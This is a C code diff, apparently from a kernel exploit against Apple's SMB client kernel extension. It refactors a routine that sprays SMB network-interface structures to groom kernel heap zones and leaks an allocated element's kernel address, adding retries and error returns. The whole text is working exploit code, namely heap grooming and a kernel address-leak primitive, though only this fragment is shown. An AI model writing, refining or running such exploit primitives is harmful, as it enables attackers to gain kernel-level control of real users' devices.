@@ -28,7 +28,7 @@
 #define NUM_GAP_ELEMENTS (XE_PAGE_SIZE / 32 * 3)
 #define NUM_SIZE_ELEMENTS (NUM_GAP_ELEMENTS * 2)
 
-#define MAX_TRIES 20
+#define MAX_TRIES 5
 
 
 const int zone_kext_sizes[] = {
@@ -36,7 +36,7 @@ const int zone_kext_sizes[] = {
 };
 
 
-struct kmem_zalloc_kext_small_entry kmem_zalloc_kext_small(const struct sockaddr_in* smb_addr, char* data, size_t data_size) {
+int kmem_zalloc_kext_small_try(const struct sockaddr_in* smb_addr, char* data, size_t data_size, struct kmem_zalloc_kext_small_entry* out) {
     size_t alloc_size = data_size + 8;
     assert(alloc_size < 256);
     
@@ -66,10 +66,11 @@ struct kmem_zalloc_kext_small_entry kmem_zalloc_kext_small(const struct sockaddr
         struct network_nic_info offset_infos[num_offsets];
         bzero(offset_infos, sizeof(offset_infos));
         for (int offset_idx = 0; offset_idx < num_offsets; offset_idx++) {
-            offset_infos[offset_idx].addr_4.sin_family = AF_INET;
-            offset_infos[offset_idx].addr_4.sin_addr.s_addr = gap_idx * 4 + offset_idx;
-            offset_infos[offset_idx].addr_4.sin_len = sizeof(struct sockaddr_in);
-            offset_infos[offset_idx].next_offset = sizeof(struct network_nic_info);
+            struct network_nic_info* info = &offset_infos[offset_idx];
+            info->addr_4.sin_family = AF_INET;
+            info->addr_4.sin_addr.s_addr = gap_idx * 4 + offset_idx;
+            info->addr_4.sin_len = sizeof(struct sockaddr_in);
+            info->next_offset = sizeof(struct network_nic_info);
         }
         
         struct network_nic_info* element_info = alloca(sizeof(struct network_nic_info) + 128);
@@ -135,9 +136,7 @@ struct kmem_zalloc_kext_small_entry kmem_zalloc_kext_small(const struct sockaddr
     
     char data_reader[32];
     memset(data_reader, 0x80, sizeof(data_reader));
-    
-    struct kmem_zalloc_kext_small_entry alloc;
-    
+        
     for (int try = 0; try < MAX_TRIES; try++) {
         printf("try %d / %d\n", try, MAX_TRIES);
         
@@ -151,7 +150,8 @@ struct kmem_zalloc_kext_small_entry kmem_zalloc_kext_small(const struct sockaddr
             for (int j = 0; j < 32; j += 4) {
                 // may need to be improved
                 if (addr[j] != 0 && (addr[j] & (zone_size - 1)) == 0) {
-                    alloc.address = addr[j];
+                    out->address = addr[j];
+                    error = 0;
                     goto done;
                 }
             }
@@ -160,15 +160,28 @@ struct kmem_zalloc_kext_small_entry kmem_zalloc_kext_small(const struct sockaddr
         kmem_neighbor_reader_reset(reader);
     }
     
-    printf("[ERROR] failed to allocate element\n");
-    abort();
-    
+    error = EAGAIN;
 done:
     kmem_neighbor_reader_destroy(&reader);
     smb_nic_allocator_destroy(&pad_allocator);
     dispatch_apply(NUM_SIZE_ELEMENTS / 4, DISPATCH_APPLY_AUTO, ^(size_t index) {
         smb_ssn_allocator_destroy(&size_allocators[index]);
     });
+    smb_nic_allocator_destroy(&offset_allocator);
     
-    return alloc;
+    return error;
+}
+
+
+struct kmem_zalloc_kext_small_entry kmem_zalloc_kext_small(const struct sockaddr_in* smb_addr, char* data, size_t data_size) {
+    for (int i = 0; i < 3; i++) {
+        printf("try %d / %d\n", i, 3);
+        struct kmem_zalloc_kext_small_entry entry;
+        int error = kmem_zalloc_kext_small_try(smb_addr, data, data_size, &entry);
+        if (!error) {
+            return entry;
+        }
+    }
+    printf("[ERROR] alloc failed\n");
+    abort();
 }
